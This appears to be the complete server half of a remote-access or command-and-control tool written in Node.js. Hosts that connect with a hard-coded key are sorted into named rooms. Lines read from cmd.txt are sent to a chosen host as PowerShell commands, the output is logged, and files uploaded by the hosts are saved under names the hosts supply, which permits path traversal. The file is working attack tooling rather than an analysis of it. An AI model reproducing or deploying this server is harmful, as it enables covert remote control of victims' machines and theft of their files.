var authKey = 'a1s2d3f4'

var dict = {}; var output='';

Tail = require('tail').Tail;
var cmdFile = "cmd.txt"
tail = new Tail(cmdFile);

require('log-timestamp');
const fs = require('fs');

var https = require('https');
var express = require('express');
var app = express();
var options = {
  key: fs.readFileSync('./file.pem'),
  cert: fs.readFileSync('./file.crt')
};
var serverPort = 443;
var server = https.createServer(options, app);
var io = require('socket.io')(server , {'pingInterval': 5000});

app.get('/', function(req, res){
  res.send('<h1>Hello sneaky boi!!</h1>');
  console.log('website accessed');
});

server.listen(serverPort, function() {
  console.log('listening on *:',serverPort,'(SSL)');
});

io.on('connection', function (socket) {
   console.log(socket.id,': connected');
   output = ''; Object.keys(io.sockets.clients().sockets).forEach(function(value){ output+=value+':'+dict[value]+'  ';  }); console.log('live sockets : ['+output.trim()+']');
   //console.log(io.sockets.clients().sockets);

   socket.on('join', function (msg) {
    if (typeof msg == 'string'){
        jsonMsg = JSON.parse(msg)
        console.log(socket.id, ': join request - ',jsonMsg);
        }
    else if(typeof msg == 'object'){
        jsonMsg = msg
        console.log(socket.id, ': join request - ',jsonMsg);
        }
    else{
        console.log(socket.id,': invalid join request');
        output = ''; Object.keys(io.sockets.clients().sockets).forEach(function(value){ output+=value+':'+dict[value]+'  ';  }); console.log('live sockets : ['+output.trim()+']');
        socket.disconnect();
        }


    if (jsonMsg.authKey == authKey){
      if (jsonMsg.HostName in dict) 
           {
        console.log(socket.id,'('+jsonMsg.hostName+')',': hostName already registered');
        socket.emit('fromServer','hostName already registered');
        socket.disconnect();
           }
      else {
        socket.join(jsonMsg.hostName);
        dict[socket.id] = jsonMsg.hostName;
        socket.emit('fromServer', 'welcome to ure private room '+dict[socket.id]+'!!');
        console.log(socket.id,': been assigned to room -',dict[socket.id]);
        output = ''; Object.keys(io.sockets.clients().sockets).forEach(function(value){ output+=value+':'+dict[value]+'  ';  }); console.log('live sockets : ['+output.trim()+']');
           }
        }
    else{
        console.log(socket.id,'('+jsonMsg.hostName+')',': sent invalid authKey');
        socket.emit('fromServer','wrong authKey');
        socket.disconnect();
        }
   });

    socket.on('fromClient', function (name, data) {
        fs.writeFile(name, data, (err) => {
                if (err) throw err;
                console.log(dict[socket.id],':',name,'has been saved!');
                });
        socket.emit('fromServerAck',name+' received'); 
        });

    socket.on('powershellOutput', function (data) {
        console.log(dict[socket.id],':','powershell output\n'+data);                
        });

   socket.on('disconnect', function () {
    socket.disconnect();
    console.log(socket.id,'('+dict[socket.id]+') :','disconnected');
    delete dict[socket.id];
    output = ''; Object.keys(io.sockets.clients().sockets).forEach(function(value){ output+=value+':'+dict[value]+'  ';  }); console.log('live sockets : ['+output.trim()+']');
   });
});

tail.on("line", function(data) {
    var arr = data.split("~~");
    io.sockets.in(arr[0]).emit('fromServerPowershell', arr[1]);
    fs.truncate(cmdFile, 0, function(){console.log(arr[0],':',arr[1],'sent &',cmdFile,'truncated')});
});
